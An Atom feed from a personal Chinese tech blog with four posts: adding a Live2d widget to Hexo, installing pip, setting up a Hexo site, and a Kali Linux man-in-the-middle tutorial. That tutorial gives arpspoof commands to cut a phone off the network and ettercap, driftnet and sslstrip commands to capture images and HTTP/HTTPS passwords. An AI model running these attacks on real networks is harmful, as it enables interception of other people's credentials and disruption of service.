<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>GZ&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://gz1903.github.io/"/>
  <updated>2019-10-15T13:51:58.831Z</updated>
  <id>https://gz1903.github.io/</id>
  
  <author>
    <name>GZ</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hexo添加Live2d看板动画效果</title>
    <link href="https://gz1903.github.io/2019/10/15/Hexo%E6%B7%BB%E5%8A%A0Live2d%E7%9C%8B%E6%9D%BF%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C/"/>
    <id>https://gz1903.github.io/2019/10/15/Hexo添加Live2d看板动画效果/</id>
    <published>2019-10-15T13:43:27.000Z</published>
    <updated>2019-10-15T13:51:58.831Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>Hexo是一个快速、简洁且高效的博客框架，能够快速生成静态页面，只需一条指令即可部署到 GitHub Pages, Heroku 或其他网站，支持 GitHub Flavored Markdown 的所有功能，同时还拥有强大的插件系统。</p><p><img alt data-src="https://p.pstatp.com/origin/fe4a0000a08fd0c13898" class="lozad"></p><p>为增添页面趣味性，这次主要介绍 <strong>Hexo</strong> 添加Live2d看板动画效果。</p><h1 id="添加Live2d看板动画"><a href="#添加Live2d看板动画" class="headerlink" title="添加Live2d看板动画"></a>添加Live2d看板动画</h1><p><strong><a href="https://github.com/xiazeyu/live2d-widget-models/commit/231c840a120e28ad74e7341f784dd08248caf059" target="_blank" rel="noopener">看板动画</a></strong></p><p>站点根目录下载插件，安装成功后，你可以在你的站点根文件夹<code>/node_modules/</code>底下找到<code>live2d-widget</code>这个文件夹。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure><p>安装你想要的live2d动画人物，这里选择 <code>live2d-widget-model-koharu</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install live2d-widget-model-koharu</span><br></pre></td></tr></table></figure><p>在站点根目录下<code>_config.yml</code>添加如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#live2d看板动画</span><br><span class="line">live2d:</span><br><span class="line">  enable: true</span><br><span class="line">  scriptFrom: local</span><br><span class="line">  pluginRootPath: live2dw/</span><br><span class="line">  pluginJsPath: lib/</span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  tagMode: false</span><br><span class="line">  log: false</span><br><span class="line">  model:</span><br><span class="line">    use: live2d-widget-model-haruto</span><br><span class="line">  display:</span><br><span class="line">    superSample: 2</span><br><span class="line">    width: 150</span><br><span class="line">    height: 300</span><br><span class="line">    position: right</span><br><span class="line">    hOffset: 100</span><br><span class="line">    vOffset: -50</span><br><span class="line">  mobile:</span><br><span class="line">    show: true </span><br><span class="line">    scale: 0.5</span><br><span class="line">react:</span><br><span class="line">    opacityDefault: 0.7</span><br><span class="line">    opacityOnHover: 0.2</span><br></pre></td></tr></table></figure><h1 id="本地预览效果"><a href="#本地预览效果" class="headerlink" title="本地预览效果"></a>本地预览效果</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure><h1 id="Live2d各个模型："><a href="#Live2d各个模型：" class="headerlink" title="Live2d各个模型："></a>Live2d各个模型：</h1><h3 id="live2d-widget-model-chitose"><a href="#live2d-widget-model-chitose" class="headerlink" title="live2d-widget-model-chitose"></a>live2d-widget-model-chitose</h3><p><img alt data-src="https://p.pstatp.com/origin/fe4a0000a08d891a1549" class="lozad"></p><h3 id="live2d-widget-model-epsilon2-1"><a href="#live2d-widget-model-epsilon2-1" class="headerlink" title="live2d-widget-model-epsilon2_1"></a>live2d-widget-model-epsilon2_1</h3><p><img alt data-src="https://p.pstatp.com/origin/fed40000cc5a743e5149" class="lozad"></p><h3 id="live2d-widget-model-haru-01"><a href="#live2d-widget-model-haru-01" class="headerlink" title="live2d-widget-model-haru_01"></a>live2d-widget-model-haru_01</h3><p><img alt data-src="https://p.pstatp.com/origin/ff710000a431bce325bb" class="lozad"></p><h3 id="live2d-widget-model-haru-02"><a href="#live2d-widget-model-haru-02" class="headerlink" title="live2d-widget-model-haru_02"></a>live2d-widget-model-haru_02</h3><p><img alt data-src="https://p.pstatp.com/origin/ffd400009132cc544f22" class="lozad"></p><h3 id="live2d-widget-model-haruto"><a href="#live2d-widget-model-haruto" class="headerlink" title="live2d-widget-model-haruto"></a>live2d-widget-model-haruto</h3><p><img alt data-src="https://p.pstatp.com/origin/ff7c00005b37bf013a3c" class="lozad"></p><h3 id="live2d-widget-model-koharu"><a href="#live2d-widget-model-koharu" class="headerlink" title="live2d-widget-model-koharu"></a>live2d-widget-model-koharu</h3><p><img alt data-src="https://p.pstatp.com/origin/ffaf00008314d58db851" class="lozad"></p><h3 id="live2d-widget-model-hibiki"><a href="#live2d-widget-model-hibiki" class="headerlink" title="live2d-widget-model-hibiki"></a>live2d-widget-model-hibiki</h3><p><img alt data-src="https://p.pstatp.com/origin/ff3000005d80a386f62a" class="lozad"></p><h3 id="live2d-widget-model-miku"><a href="#live2d-widget-model-miku" class="headerlink" title="live2d-widget-model-miku"></a>live2d-widget-model-miku</h3><p><img alt data-src="https://p.pstatp.com/origin/ff3d000080e58996f61a" class="lozad"></p><h3 id="live2d-widget-model-hijiki"><a href="#live2d-widget-model-hijiki" class="headerlink" title="live2d-widget-model-hijiki"></a>live2d-widget-model-hijiki</h3><p><img alt data-src="https://p.pstatp.com/origin/fe73000080c3e97be163" class="lozad"></p><h3 id="live2d-widget-model-tororo"><a href="#live2d-widget-model-tororo" class="headerlink" title="live2d-widget-model-tororo"></a>live2d-widget-model-tororo</h3><p><img alt data-src="https://p.pstatp.com/origin/fff700008b02b33ba68f" class="lozad"></p><h3 id="live2d-widget-model-izumi"><a href="#live2d-widget-model-izumi" class="headerlink" title="live2d-widget-model-izumi"></a>live2d-widget-model-izumi</h3><p><img alt data-src="https://p.pstatp.com/origin/fe9500010f2eb3e81fce" class="lozad"></p><h3 id="live2d-widget-model-nico"><a href="#live2d-widget-model-nico" class="headerlink" title="live2d-widget-model-nico"></a>live2d-widget-model-nico</h3><p><img alt data-src="https://p.pstatp.com/origin/ff4300012a0d2fd26fe0" class="lozad"></p><h3 id="live2d-widget-model-nietzsche"><a href="#live2d-widget-model-nietzsche" class="headerlink" title="live2d-widget-model-nietzsche"></a>live2d-widget-model-nietzsche</h3><p><img alt data-src="https://p.pstatp.com/origin/dc0e0003fe591e30be22" class="lozad"></p><h3 id="live2d-widget-model-ni-j"><a href="#live2d-widget-model-ni-j" class="headerlink" title="live2d-widget-model-ni-j"></a>live2d-widget-model-ni-j</h3><p><img alt data-src="https://p.pstatp.com/origin/ff2a00009569ea4124da" class="lozad"></p><h3 id="live2d-widget-model-nipsilon"><a href="#live2d-widget-model-nipsilon" class="headerlink" title="live2d-widget-model-nipsilon"></a>live2d-widget-model-nipsilon</h3><p><img alt data-src="https://p.pstatp.com/origin/ff9100008f839fa2b69f" class="lozad"></p><h3 id="live2d-widget-model-nito"><a href="#live2d-widget-model-nito" class="headerlink" title="live2d-widget-model-nito"></a>live2d-widget-model-nito</h3><p><img alt data-src="https://p.pstatp.com/origin/ff920000e23707f31859" class="lozad"></p><h3 id="live2d-widget-model-shizuku"><a href="#live2d-widget-model-shizuku" class="headerlink" title="live2d-widget-model-shizuku"></a>live2d-widget-model-shizuku</h3><p><img alt data-src="https://p.pstatp.com/origin/ff2000007cf8512db0cb" class="lozad"></p><h3 id="live2d-widget-model-tsumiki"><a href="#live2d-widget-model-tsumiki" class="headerlink" title="live2d-widget-model-tsumiki"></a>live2d-widget-model-tsumiki</h3><p><img alt data-src="https://p.pstatp.com/origin/fffb00003b22de60ed66" class="lozad"></p><h3 id="live2d-widget-model-unitychan"><a href="#live2d-widget-model-unitychan" class="headerlink" title="live2d-widget-model-unitychan"></a>live2d-widget-model-unitychan</h3><p><img alt data-src="https://p.pstatp.com/origin/dc10000289606c5ec97d" class="lozad"></p><h3 id="live2d-widget-model-gf"><a href="#live2d-widget-model-gf" class="headerlink" title="live2d-widget-model-gf"></a>live2d-widget-model-gf</h3><p><img alt data-src="https://p.pstatp.com/origin/10000000039a141fd6695" class="lozad"></p><h3 id="live2d-widget-model-wanko"><a href="#live2d-widget-model-wanko" class="headerlink" title="live2d-widget-model-wanko"></a>live2d-widget-model-wanko</h3><p><img alt data-src="https://p.pstatp.com/origin/fead00009151e943e78c" class="lozad"></p><h3 id="live2d-widget-model-z16"><a href="#live2d-widget-model-z16" class="headerlink" title="live2d-widget-model-z16"></a>live2d-widget-model-z16</h3><p><img alt data-src="https://p.pstatp.com/origin/fe3200011fc5d922916c" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Hexo" scheme="https://gz1903.github.io/categories/Hexo/"/>
    
      <category term="教程" scheme="https://gz1903.github.io/categories/Hexo/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="Hexo" scheme="https://gz1903.github.io/tags/Hexo/"/>
    
      <category term="教程" scheme="https://gz1903.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Linux下pip的安装</title>
    <link href="https://gz1903.github.io/2019/10/15/Linux%E4%B8%8Bpip%E7%9A%84%E5%AE%89%E8%A3%85/"/>
    <id>https://gz1903.github.io/2019/10/15/Linux下pip的安装/</id>
    <published>2019-10-15T09:43:30.000Z</published>
    <updated>2019-10-15T11:15:37.859Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="安装wget："><a href="#安装wget：" class="headerlink" title="安装wget："></a>安装wget：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install wget</span><br></pre></td></tr></table></figure><h1 id="安装pip："><a href="#安装pip：" class="headerlink" title="安装pip："></a>安装pip：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br><span class="line"></span><br><span class="line">python get-pip.py</span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/ff87000075deea18a108" class="lozad"></p><h1 id="查看pip版本"><a href="#查看pip版本" class="headerlink" title="查看pip版本"></a>查看pip版本</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip  -V</span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/fe470000da47755376c2" class="lozad"></p><p><strong>如果出现错误</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/usr/bin/pip&quot;, line 7, in &lt;module&gt;</span><br><span class="line">    from pip._internal import main</span><br><span class="line">ModuleNotFoundError: No module named &apos;pip._internal&apos;</span><br></pre></td></tr></table></figure><p><strong>因为这个错误导致 pip找不到</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python -m ensurepip</span><br><span class="line"></span><br><span class="line">python -m pip install --upgrade pip</span><br><span class="line"></span><br><span class="line">pip  -V</span><br></pre></td></tr></table></figure><h1 id="pip3"><a href="#pip3" class="headerlink" title="pip3"></a>pip3</h1><p><a href="https://www.gz1903.club/2019/10/08/Linux-%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Python3/" target="_blank" rel="noopener">安装python3</a>的时候会自动安装pip3</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://gz1903.github.io/categories/Linux/"/>
    
      <category term="Python" scheme="https://gz1903.github.io/categories/Linux/Python/"/>
    
      <category term="pip" scheme="https://gz1903.github.io/categories/Linux/Python/pip/"/>
    
    
      <category term="Linux" scheme="https://gz1903.github.io/tags/Linux/"/>
    
      <category term="Python" scheme="https://gz1903.github.io/tags/Python/"/>
    
      <category term="pip" scheme="https://gz1903.github.io/tags/pip/"/>
    
  </entry>
  
  <entry>
    <title>kali linux--中间人攻击</title>
    <link href="https://gz1903.github.io/2019/10/13/kali-linux-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    <id>https://gz1903.github.io/2019/10/13/kali-linux-中间人攻击/</id>
    <published>2019-10-13T06:15:38.000Z</published>
    <updated>2019-10-14T06:33:06.214Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。</p><h2 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h2><p>通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的进行。</p><h3 id="ARP攻击的局限性"><a href="#ARP攻击的局限性" class="headerlink" title="ARP攻击的局限性"></a>ARP攻击的局限性</h3><p>ARP攻击仅能在以太网（局域网如：机房、内网、公司网络等）进行。 </p><p>无法对外网（互联网、非本区域内的局域网）进行攻击。</p><h3 id="ARP攻击的攻击原理"><a href="#ARP攻击的攻击原理" class="headerlink" title="ARP攻击的攻击原理"></a>ARP攻击的攻击原理</h3><p>ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="环境：kali-linux"><a href="#环境：kali-linux" class="headerlink" title="环境：kali-linux"></a>环境：kali-linux</h3><h3 id="工具：arpspoof"><a href="#工具：arpspoof" class="headerlink" title="工具：arpspoof"></a>工具：arpspoof</h3><h4 id="获取自己的网卡，IP，网关信息。"><a href="#获取自己的网卡，IP，网关信息。" class="headerlink" title="获取自己的网卡，IP，网关信息。"></a>获取自己的网卡，IP，网关信息。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/ff3b00005cae4290e2ca" class="lozad"></p><h4 id="获取目标ip与网关信息。"><a href="#获取目标ip与网关信息。" class="headerlink" title="获取目标ip与网关信息。"></a>获取目标ip与网关信息。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 10.3.138.1/24</span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/ffe2000076a7ddfa9f0f" class="lozad"></p><h2 id="断网攻击"><a href="#断网攻击" class="headerlink" title="断网攻击"></a>断网攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.8.100 192.168.8.8</span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/10001000021821e51122f" class="lozad"></p><blockquote><p>攻击完成，此时被攻击手机无法上网。（ctrl+Z）（ctrl+C）可停止攻击</p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/ff3800005a18018f4849" class="lozad"></p><h2 id="数据抓取"><a href="#数据抓取" class="headerlink" title="数据抓取"></a>数据抓取</h2><blockquote><p>首先要开始IP转发功能，linux因为系统安全考虑，是不支持IP转发的，其配置文件写在/proc/sys/net/ipv4的ip_forward中。默认为0，接下来修改为1。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>修改完成后不显示，但可以用 <code>cat /proc/sys/net/ipv4/ip_forward</code>来确实是否修改成功。</p><p><img alt data-src="https://p.pstatp.com/origin/ffe6000090cded42ce48" class="lozad"></p><h4 id="抓取使用http协议的网页的图片"><a href="#抓取使用http协议的网页的图片" class="headerlink" title="抓取使用http协议的网页的图片"></a>抓取使用http协议的网页的图片</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure><blockquote><p>弹出对话框！！</p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/fe3c0000c4a5a55f4852" class="lozad"></p><h4 id="http账户密码获取"><a href="#http账户密码获取" class="headerlink" title="http账户密码获取"></a>http账户密码获取</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tp -i eth0</span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/fe630000d607f86aa21c" class="lozad"></p><h4 id="https账户密码获取"><a href="#https账户密码获取" class="headerlink" title="https账户密码获取"></a>https账户密码获取</h4><blockquote><p>使https链接还原为http s </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -a -f -k sslstrip</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="kali" scheme="https://gz1903.github.io/categories/kali/"/>
    
      <category term="渗透" scheme="https://gz1903.github.io/categories/kali/%E6%B8%97%E9%80%8F/"/>
    
      <category term="Linux" scheme="https://gz1903.github.io/categories/kali/%E6%B8%97%E9%80%8F/Linux/"/>
    
    
      <category term="Linux" scheme="https://gz1903.github.io/tags/Linux/"/>
    
      <category term="kali" scheme="https://gz1903.github.io/tags/kali/"/>
    
      <category term="渗透" scheme="https://gz1903.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>hexo——轻量、简易的博客</title>
    <link href="https://gz1903.github.io/2019/10/12/hexo%E2%80%94%E2%80%94%E8%BD%BB%E9%87%8F%E3%80%81%E7%AE%80%E6%98%93%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
    <id>https://gz1903.github.io/2019/10/12/hexo——轻量、简易的博客/</id>
    <published>2019-10-12T06:40:46.000Z</published>
    <updated>2019-10-14T06:19:09.973Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="hexo介绍"><a href="#hexo介绍" class="headerlink" title="hexo介绍"></a>hexo介绍</h1><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="http://daringfireball.net/projects/markdown/" target="_blank" rel="noopener">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><h1 id="hexo环境搭建"><a href="#hexo环境搭建" class="headerlink" title="hexo环境搭建"></a>hexo环境搭建</h1><p>安装 Hexo 相当简单，只需要先安装下列应用程序即可：</p><ul><li><a href="http://nodejs.org/" target="_blank" rel="noopener">Node.js</a> (Node.js 版本需不低于 8.6，建议使用 Node.js 10.0 及以上版本)</li><li><a href="http://git-scm.com/" target="_blank" rel="noopener">Git</a></li></ul><h2 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h2><ul><li>Windows：下载并安装 <a href="https://git-scm.com/download/win" target="_blank" rel="noopener">git</a>.</li><li>Mac：使用 <a href="http://mxcl.github.com/homebrew/" target="_blank" rel="noopener">Homebrew</a>, <a href="http://www.macports.org/" target="_blank" rel="noopener">MacPorts</a> ：<code>brew install git</code>;或下载 <a href="http://sourceforge.net/projects/git-osx-installer/" target="_blank" rel="noopener">安装程序</a> 安装。</li><li>Linux (Ubuntu, Debian)：<code>sudo apt-get install git-core</code></li><li>Linux (Fedora, Red Hat, CentOS)：<code>sudo yum install git-core</code></li></ul><h2 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h2><p>安装 Node.js 的最佳方式是使用 <a href="https://github.com/nvm-sh/nvm" target="_blank" rel="noopener">nvm</a>。nvm 的开发者提供了一个自动安装 nvm 的简单脚本：</p><h4 id="cURL"><a href="#cURL" class="headerlink" title="cURL:"></a>cURL:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | sh</span><br></pre></td></tr></table></figure><h4 id="Wget"><a href="#Wget" class="headerlink" title="Wget:"></a>Wget:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | sh</span><br></pre></td></tr></table></figure><p>安装完成后，重启终端并执行下列命令即可安装 Node.js。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm install node</span><br></pre></td></tr></table></figure><p>安装git：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install git</span><br></pre></td></tr></table></figure><h2 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h2><p>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><h1 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h1><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo init Blog </span><br><span class="line">cd Blog</span><br><span class="line">npm install</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>本地访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/fe700000dcd2bfafea6c" class="lozad"></p><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.├── _config.yml</span><br><span class="line"> ├── package.json</span><br><span class="line"> ├── scaffolds</span><br><span class="line"> ├── source|</span><br><span class="line"> ├── _drafts|</span><br><span class="line"> └── _posts</span><br><span class="line"> └── themes</span><br></pre></td></tr></table></figure><table><thead><tr><th>文件/文件夹</th><th>说明</th></tr></thead><tbody><tr><td>_config.yml</td><td>配置文件</td></tr><tr><td>public</td><td>生成的静态文件，这个目录最终会发布到服务器</td></tr><tr><td>scaffolds</td><td>一些通用的markdown模板</td></tr><tr><td>source</td><td>编写的markdown文件，_drafts草稿文件，_posts发布的文章</td></tr><tr><td>themes</td><td>主题文件夹。Hexo 会根据主题来生成静态页面。</td></tr></tbody></table><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h4 id="编写Blog"><a href="#编写Blog" class="headerlink" title="编写Blog"></a>编写Blog</h4><p>执行下列命令来创建一篇新文章或者新的页面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;hexo&quot;</span><br></pre></td></tr></table></figure><blockquote><p>您可以在命令中指定文章的布局（layout），默认为 post，可以通过修改 _config.yml 中的 default_layout 参数来指定默认布局。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">vim source/_post/hexo</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">title: hexo——轻量、简易的博客</span><br><span class="line">date: 2019-10-12 14:40:46</span><br><span class="line">tags: </span><br><span class="line">  - Hexo</span><br><span class="line">  - 教程</span><br><span class="line">categories:</span><br><span class="line">  - Hexo</span><br><span class="line">  - 教程</span><br><span class="line">keywords: &quot;Hexo,Blog,Linux&quot;</span><br><span class="line">top_img:</span><br><span class="line">cover: https://i.loli.net/2019/10/12/gye1tIzLdiuwX2S.jpg</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">Hello word</span><br></pre></td></tr></table></figure><h4 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h4><h5 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h5><p>安装 <a href="https://github.com/hexojs/hexo-deployer-git" target="_blank" rel="noopener">hexo-deployer-git</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>创建<a href="https://github.com" target="_blank" rel="noopener">Github</a>项目:</p><p><img alt data-src="https://p.pstatp.com/origin/ffb8000051e98820be1e" class="lozad"></p><p>设置项目:</p><p><img alt data-src="https://p.pstatp.com/origin/ff970000c37f1291de70" class="lozad"></p><p>在开始之前，您必须先在 <code>_config.yml</code> 中修改参数，一个正确的部署配置中至少要有 <code>type</code> 参数，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:  </span><br><span class="line">type: git</span><br><span class="line">repo：</span><br><span class="line">branch：master</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>repo</td><td>库（Repository）地址</td></tr><tr><td>branch</td><td>分支名称。如果不指定，则默认值为 master</td></tr><tr><td>message</td><td>自定义提交信息</td></tr></tbody></table><p>Hexo 提供了快速方便的一键部署功能，只需一条命令就能将网站部署到服务器上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Hexo" scheme="https://gz1903.github.io/categories/Hexo/"/>
    
      <category term="教程" scheme="https://gz1903.github.io/categories/Hexo/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="Hexo" scheme="https://gz1903.github.io/tags/Hexo/"/>
    
